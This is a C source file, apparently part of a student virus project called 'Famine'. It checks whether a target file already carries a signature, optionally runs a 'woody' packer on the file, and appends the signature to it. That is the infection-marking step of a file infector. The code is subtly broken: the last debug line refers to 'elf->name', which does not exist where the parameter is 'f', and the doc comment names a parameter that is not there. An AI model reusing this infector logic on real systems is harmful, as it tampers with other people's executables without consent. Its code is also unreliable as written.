#include <famine.h>

/**
 * @brief Check if the file is already signed
 * @param file The FamineFile structure
 * @param fd The file descriptor of the opened file
 * @return TRUE if already signed, FALSE otherwise
 */
static s8 check_already_signed(FamineFile *file, int fd) {
    char signature[256] = {};

    s64 read_bytes = 0;
    lseek(fd, file->size - SIGNATURE_LEN, SEEK_SET);
    read_bytes = read(fd, signature, SIGNATURE_LEN);
    if (read_bytes != SIGNATURE_LEN) {
        ERR("Failed to read signature from file: %s, %ld bytes read\n", file->name, read_bytes);
        return (TRUE);
    } else if (ft_strncmp(signature, SIGNATURE, SIGNATURE_LEN) == 0) {
        DBG("File %s is already signed.\n", file->name);
        return (TRUE);
    }
    return (FALSE);
}



/** 
 * @brief Inject the signature into the ELF file
 * @param elf The FamineFile structure
 */
void famine_injection(FamineFile *f, void *input, int woody_init_ok) {
    DBG("Injecting signature: %s", SIGNATURE);
    int fd = open(f->name, O_RDWR | O_APPEND);
    if (fd < 0) {
        ERR("Failed to open file %s\n", f->name);
        return;
    } else if (check_already_signed(f, fd)) {
        close(fd);
        return;
    }
    close(fd);
    fd = -1;

    #ifdef FAMINE_BONUS
        UserInput *i = (UserInput *)input;
        if (i->path) {
            free(i->path);
        }
        INFO("Preparing to process Woody on file: %s\n", f->name);
        i->path = ft_strdup(f->name);
        if (woody_init_ok) {
            woody_woodpacker(i);
        }
    #endif

    fd = open(f->name, O_RDWR | O_APPEND);
    if (fd < 0) {
        ERR("Failed to open file for signature injection: %s\n", f->name);
        return;
    }
    if (write(fd, SIGNATURE, SIGNATURE_LEN) < 0) {
        ERR("Failed to write signature to file: %s\n", f->name);
    } else {
        DBG("Signature injected successfully to: %s.\n", elf->name);
    }
    close(fd);
}
